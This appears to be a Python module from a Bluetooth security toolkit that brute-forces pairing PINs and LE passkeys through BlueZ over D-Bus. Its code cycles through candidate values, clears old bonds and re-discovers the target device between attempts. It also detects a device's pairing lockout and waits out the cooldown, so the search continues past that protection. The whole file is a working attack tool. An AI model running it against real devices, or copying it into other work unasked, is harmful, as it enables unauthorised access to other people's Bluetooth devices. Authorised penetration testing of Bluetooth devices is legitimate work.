"""
PIN / Passkey brute-force orchestrator for Bluetooth pairing.

Drives repeated pair → check → remove → retry cycles, feeding candidate
PINs or passkeys via ``BruteForceIOHandler`` until the correct value is
found or the search space is exhausted.

Lockout-aware: detects the transition from ``AuthenticationFailed`` (wrong
PIN) to ``AuthenticationRejected`` (device refusing to test) and pauses
for a configurable cooldown before retrying the rejected candidate.
"""

from __future__ import annotations

import time
from dataclasses import dataclass, field
from typing import Iterator, List, Optional

import dbus

from bleep.bt_ref.constants import BLUEZ_SERVICE_NAME, DEVICE_INTERFACE, DBUS_PROPERTIES
from bleep.core.log import print_and_log, LOG__GENERAL, LOG__AGENT, LOG__DEBUG


@dataclass
class BruteForceResult:
    """Outcome of a brute-force run."""
    success: bool
    pin: Optional[str] = None
    passkey: Optional[int] = None
    attempts: int = 0
    elapsed_seconds: float = 0.0
    stopped_reason: str = ""
    lockout_pauses: int = 0
    errors: List[str] = field(default_factory=list)


class PinBruteForcer:
    """Orchestrates repeated pairing attempts to discover a device's PIN or passkey.

    Each attempt follows the proven cycle from the debug-mode PoC:
    unregister agent → register with next candidate → RemoveDevice (clear
    stale bond) → re-discover → pair_device() → evaluate result.

    Lockout detection
    -----------------
    Many Bluetooth devices implement a **pairing lockout** after a number of
    consecutive failed attempts.  BlueZ surfaces this as
    ``org.bluez.Error.AuthenticationRejected`` — the device refuses to even
    evaluate the supplied PIN, regardless of correctness.

    When a transition from ``AuthenticationFailed`` (wrong PIN, device tested
    it) to ``AuthenticationRejected`` (device refusing outright) is detected,
    the brute forcer pauses for ``lockout_cooldown`` seconds, then retries the
    rejected candidate.  This avoids skipping the correct PIN during a lockout
    window.

    Parameters
    ----------
    bus : dbus.SystemBus
        System D-Bus connection.
    adapter_path : str
        D-Bus object path of the local adapter (e.g. ``/org/bluez/hci0``).
    delay : float
        Seconds to wait between attempts (rate-limiting).
    max_attempts : int
        Upper bound on total attempts (0 = unlimited).
    timeout_per_attempt : int
        Seconds to allow each ``pair_device()`` call.
    lockout_cooldown : float
        Seconds to wait when a device lockout is detected (default 60).
    max_lockout_retries : int
        Max consecutive lockout-retry cycles for a single candidate before
        declaring the device persistently locked and aborting (default 3).
    """

    # Wrong PIN — device tested and rejected the value.
    _WRONG_PIN_ERRORS = frozenset({
        "org.bluez.Error.AuthenticationFailed",
    })

    # Device refuses to attempt pairing at all (lockout or policy).
    _LOCKOUT_ERRORS = frozenset({
        "org.bluez.Error.AuthenticationRejected",
    })

    # Non-fatal errors where we can still try next candidate.
    _RETRY_ERRORS = frozenset({
        "org.bluez.Error.AuthenticationCanceled",
        "org.bluez.Error.AuthenticationTimeout",
    })

    # Errors that suggest the device/adapter is unreachable — stop early.
    _BLOCKING_ERRORS = frozenset({
        "org.bluez.Error.ConnectionAttemptFailed",
        "org.bluez.Error.NotReady",
    })

    def __init__(
        self,
        bus: dbus.SystemBus,
        adapter_path: str = "/org/bluez/hci0",
        delay: float = 0.5,
        max_attempts: int = 0,
        timeout_per_attempt: int = 30,
        lockout_cooldown: float = 60.0,
        max_lockout_retries: int = 3,
    ):
        self._bus = bus
        self._adapter_path = adapter_path
        self.delay = delay
        self.max_attempts = max_attempts
        self.timeout_per_attempt = timeout_per_attempt
        self.lockout_cooldown = lockout_cooldown
        self.max_lockout_retries = max_lockout_retries
        self._stop_requested = False

    def stop(self) -> None:
        """Request a graceful stop after the current attempt finishes."""
        self._stop_requested = True

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def run_pin_brute(
        self,
        mac: str,
        pin_iterator: Iterator[str],
        capabilities: str = "KeyboardDisplay",
        discover_duration: int = 10,
    ) -> BruteForceResult:
        """Brute-force a PIN code for a BR/EDR device.

        Parameters
        ----------
        mac : str
            Target device MAC address (e.g. ``D8:3A:DD:0B:69:B9``).
        pin_iterator : Iterator[str]
            Yields candidate PIN strings.
        capabilities : str
            Agent capability to register (must include RequestPinCode).
        discover_duration : int
            Seconds to spend on discovery if device disappears.

        Returns
        -------
        BruteForceResult
        """
        return self._run(mac, pin_iterator, None, capabilities, discover_duration)

    def run_passkey_brute(
        self,
        mac: str,
        passkey_iterator: Iterator[int],
        capabilities: str = "KeyboardDisplay",
        discover_duration: int = 10,
    ) -> BruteForceResult:
        """Brute-force a passkey for an LE device.

        Parameters
        ----------
        mac : str
            Target device MAC address.
        passkey_iterator : Iterator[int]
            Yields candidate passkey integers (0-999999).
        capabilities : str
            Agent capability to register.
        discover_duration : int
            Seconds to spend on discovery if device disappears.

        Returns
        -------
        BruteForceResult
        """
        return self._run(mac, None, passkey_iterator, capabilities, discover_duration)

    # ------------------------------------------------------------------
    # Internal
    # ------------------------------------------------------------------

    def _run(
        self,
        mac: str,
        pin_iter: Optional[Iterator[str]],
        passkey_iter: Optional[Iterator[int]],
        capabilities: str,
        discover_duration: int,
    ) -> BruteForceResult:
        from bleep.dbuslayer.agent import PairingAgent, clear_default_pairing_agent
        from bleep.dbuslayer.agent_io import create_io_handler
        from bleep.dbuslayer.adapter import system_dbus__bluez_adapter as Adapter

        mac = mac.upper()
        adapter = Adapter()
        result = BruteForceResult(success=False)
        start_time = time.time()
        self._stop_requested = False
        consecutive_blocking = 0
        had_auth_failed = False  # True once we've seen at least one wrong-PIN error

        mode = "pin" if pin_iter is not None else "passkey"
        print_and_log(
            f"[*] BruteForce: starting {mode} brute-force against {mac} "
            f"(lockout cooldown: {self.lockout_cooldown}s, "
            f"max lockout retries: {self.max_lockout_retries})",
            LOG__GENERAL,
        )

        try:
            for candidate in (pin_iter if pin_iter else passkey_iter):
                if self._stop_requested:
                    result.stopped_reason = "user_stop"
                    break

                if 0 < self.max_attempts <= result.attempts:
                    result.stopped_reason = "max_attempts"
                    break

                lockout_retries = 0

                while True:  # inner loop handles lockout-retry for same candidate
                    if self._stop_requested:
                        result.stopped_reason = "user_stop"
                        break

                    result.attempts += 1

                    if mode == "pin":
                        io_handler = create_io_handler(
                            "bruteforce", pin_iterator=iter([candidate])
                        )
                        label = f"PIN '{candidate}'"
                    else:
                        io_handler = create_io_handler(
                            "bruteforce", passkey_iterator=iter([candidate])
                        )
                        label = f"passkey {candidate:06d}"

                    print_and_log(
                        f"[*] BruteForce attempt {result.attempts}: {label}",
                        LOG__GENERAL,
                    )

                    # -- clear previous agent, register fresh one ----------
                    try:
                        clear_default_pairing_agent()
                    except Exception:
                        pass

                    try:
                        import bleep.dbuslayer.agent as _agent_mod
                        agent = PairingAgent(
                            self._bus,
                            io_handler=io_handler,
                            auto_accept=True,
                        )
                        agent.register(capabilities=capabilities, default=True)
                        _agent_mod._DEFAULT_AGENT = agent
                    except Exception as exc:
                        msg = f"Agent registration failed: {exc}"
                        result.errors.append(msg)
                        print_and_log(f"[-] BruteForce: {msg}", LOG__GENERAL)
                        result.stopped_reason = "agent_error"
                        break

                    # -- ensure clean device state -------------------------
                    device_path = self._resolve_device(
                        mac, adapter, discover_duration
                    )
                    if device_path is None:
                        result.stopped_reason = "device_not_found"
                        result.errors.append(f"Device {mac} not found")
                        break

                    self._remove_stale_bond(mac, device_path, adapter, discover_duration)
                    device_path = self._resolve_device(
                        mac, adapter, discover_duration
                    )
                    if device_path is None:
                        result.stopped_reason = "device_lost_after_removal"
                        result.errors.append(
                            f"Device {mac} not re-discovered after bond removal"
                        )
                        break

                    # -- attempt pairing -----------------------------------
                    success = agent.pair_device(
                        device_path,
                        set_trusted=False,
                        timeout=self.timeout_per_attempt,
                    )

                    if success:
                        result.success = True
                        if mode == "pin":
                            result.pin = candidate
                        else:
                            result.passkey = candidate
                        result.stopped_reason = "found"
                        print_and_log(
                            f"[+] BruteForce: SUCCESS — {label} accepted by {mac}",
                            LOG__GENERAL,
                        )
                        self._remove_stale_bond(
                            mac, device_path, adapter, discover_duration
                        )
                        break

                    # -- classify the failure using actual D-Bus error ------
                    err = getattr(agent, "last_pair_error", None) or ""
                    should_stop = self._handle_failure(
                        err, label, mac, candidate, mode, result,
                        had_auth_failed, lockout_retries,
                    )

                    if err in self._WRONG_PIN_ERRORS:
                        had_auth_failed = True
                        consecutive_blocking = 0
                        break  # wrong PIN, advance to next candidate

                    if err in self._LOCKOUT_ERRORS and had_auth_failed:
                        lockout_retries += 1
                        if lockout_retries > self.max_lockout_retries:
                            result.stopped_reason = "persistent_lockout"
                            result.errors.append(
                                f"Device {mac} persistently locked after "
                                f"{self.max_lockout_retries} cooldown cycles"
                            )
                            break
                        result.lockout_pauses += 1
                        print_and_log(
                            f"[!] BruteForce: LOCKOUT detected for {mac} — "
                            f"pausing {self.lockout_cooldown}s before retrying "
                            f"{label} (cooldown {lockout_retries}/"
                            f"{self.max_lockout_retries})",
                            LOG__GENERAL,
                        )
                        self._interruptible_sleep(self.lockout_cooldown)
                        if self._stop_requested:
                            result.stopped_reason = "user_stop"
                            break
                        continue  # retry same candidate after cooldown

                    if err in self._LOCKOUT_ERRORS and not had_auth_failed:
                        # Lockout from a prior session or immediate rejection
                        result.lockout_pauses += 1
                        print_and_log(
                            f"[!] BruteForce: device {mac} rejecting outright "
                            f"(no prior AuthenticationFailed seen) — "
                            f"pausing {self.lockout_cooldown}s",
                            LOG__GENERAL,
                        )
                        lockout_retries += 1
                        if lockout_retries > self.max_lockout_retries:
                            result.stopped_reason = "persistent_lockout"
                            result.errors.append(
                                f"Device {mac} persistently locked "
                                f"(rejecting from start)"
                            )
                            break
                        self._interruptible_sleep(self.lockout_cooldown)
                        if self._stop_requested:
                            result.stopped_reason = "user_stop"
                            break
                        continue

                    if err in self._BLOCKING_ERRORS:
                        consecutive_blocking += 1
                        if consecutive_blocking >= 5:
                            result.stopped_reason = "device_blocking"
                            result.errors.append(
                                f"Device {mac} unreachable "
                                f"({consecutive_blocking} blocking errors)"
                            )
                            break
                    else:
                        consecutive_blocking = 0

                    break  # default: advance to next candidate

                if result.stopped_reason or result.success:
                    break

                if self.delay > 0:
                    time.sleep(self.delay)

        except KeyboardInterrupt:
            result.stopped_reason = "keyboard_interrupt"
            print_and_log(
                "\n[*] BruteForce: interrupted by user", LOG__GENERAL
            )

        result.elapsed_seconds = time.time() - start_time
        self._print_summary(result, mode, mac)
        return result

    def _resolve_device(
        self, mac: str, adapter, discover_duration: int
    ) -> Optional[str]:
        """Find or discover a device's D-Bus path."""
        path = self._find_device_path(mac)
        if path is not None:
            return path

        print_and_log(
            f"[*] BruteForce: discovering {mac} ({discover_duration}s)…",
            LOG__DEBUG,
        )
        adapter.set_discovery_filter({"Transport": "auto"})
        adapter.run_scan__timed(duration=discover_duration)
        return self._find_device_path(mac)

    def _find_device_path(self, mac: str) -> Optional[str]:
        """Resolve MAC to D-Bus object path via GetManagedObjects."""
        try:
            om = dbus.Interface(
                self._bus.get_object(BLUEZ_SERVICE_NAME, "/"),
                "org.freedesktop.DBus.ObjectManager",
            )
            for path, ifaces in om.GetManagedObjects().items():
                dev = ifaces.get(DEVICE_INTERFACE)
                if dev and str(dev.get("Address", "")).upper() == mac:
                    return str(path)
        except dbus.exceptions.DBusException:
            pass
        return None

    def _remove_stale_bond(
        self, mac: str, device_path: str, adapter, discover_duration: int
    ) -> None:
        """Remove existing pairing if present."""
        try:
            props = dbus.Interface(
                self._bus.get_object(BLUEZ_SERVICE_NAME, device_path),
                DBUS_PROPERTIES,
            )
            if bool(props.Get(DEVICE_INTERFACE, "Paired")):
                print_and_log(
                    f"[*] BruteForce: removing stale bond for {mac}",
                    LOG__DEBUG,
                )
                adapter_obj = dbus.Interface(
                    self._bus.get_object(BLUEZ_SERVICE_NAME, self._adapter_path),
                    "org.bluez.Adapter1",
                )
                adapter_obj.RemoveDevice(device_path)
                time.sleep(0.3)
        except dbus.exceptions.DBusException:
            pass

    def _handle_failure(
        self,
        err: str,
        label: str,
        mac: str,
        candidate,
        mode: str,
        result: BruteForceResult,
        had_auth_failed: bool,
        lockout_retries: int,
    ) -> bool:
        """Log contextual information about a pairing failure.

        Returns True if the caller should stop the brute-force run.
        """
        if err in self._WRONG_PIN_ERRORS:
            print_and_log(
                f"[*] BruteForce: {label} — wrong {mode} (AuthenticationFailed)",
                LOG__DEBUG,
            )
        elif err in self._LOCKOUT_ERRORS:
            print_and_log(
                f"[!] BruteForce: {label} — device rejected pairing "
                f"(AuthenticationRejected, lockout likely)",
                LOG__GENERAL,
            )
        elif err in self._BLOCKING_ERRORS:
            print_and_log(
                f"[!] BruteForce: {label} — blocking error: {err}",
                LOG__GENERAL,
            )
        else:
            print_and_log(
                f"[-] BruteForce: {label} — unexpected error: {err}",
                LOG__GENERAL,
            )
        return False

    def _interruptible_sleep(self, seconds: float) -> None:
        """Sleep in 1-second increments, checking ``_stop_requested``."""
        remaining = seconds
        while remaining > 0 and not self._stop_requested:
            chunk = min(1.0, remaining)
            time.sleep(chunk)
            remaining -= chunk

    @staticmethod
    def _print_summary(
        result: BruteForceResult, mode: str, mac: str
    ) -> None:
        """Log a human-readable summary."""
        lockout_info = ""
        if result.lockout_pauses > 0:
            lockout_info = f", lockout pauses: {result.lockout_pauses}"

        if result.success:
            value = result.pin if mode == "pin" else f"{result.passkey:06d}"
            print_and_log(
                f"[+] BruteForce complete: {mode} for {mac} = {value} "
                f"(found in {result.attempts} attempts, "
                f"{result.elapsed_seconds:.1f}s{lockout_info})",
                LOG__GENERAL,
            )
        else:
            print_and_log(
                f"[-] BruteForce complete: no valid {mode} found for {mac} "
                f"({result.attempts} attempts, "
                f"{result.elapsed_seconds:.1f}s, "
                f"reason: {result.stopped_reason or 'exhausted'}"
                f"{lockout_info})",
                LOG__GENERAL,
            )


# ------------------------------------------------------------------
# Iterator generators for common PIN / passkey ranges
# ------------------------------------------------------------------

def pin_range(start: str = "0000", end: str = "9999") -> Iterator[str]:
    """Yield zero-padded PIN strings from *start* to *end* inclusive.

    Parameters
    ----------
    start : str
        First PIN in the range (e.g. ``"0000"``).
    end : str
        Last PIN in the range (e.g. ``"9999"``).

    Yields
    ------
    str
        Zero-padded PIN string with the same width as *start*.
    """
    width = len(start)
    for i in range(int(start), int(end) + 1):
        yield str(i).zfill(width)


def passkey_range(start: int = 0, end: int = 999999) -> Iterator[int]:
    """Yield passkey integers from *start* to *end* inclusive.

    Parameters
    ----------
    start : int
        First passkey (default 0).
    end : int
        Last passkey (default 999999).

    Yields
    ------
    int
    """
    yield from range(start, end + 1)


def pins_from_file(path: str) -> Iterator[str]:
    """Yield PIN strings from a text file, one per line.

    Blank lines and lines starting with ``#`` are skipped.

    Parameters
    ----------
    path : str
        Path to the PIN list file.

    Yields
    ------
    str
    """
    with open(path) as fh:
        for line in fh:
            stripped = line.strip()
            if stripped and not stripped.startswith("#"):
                yield stripped
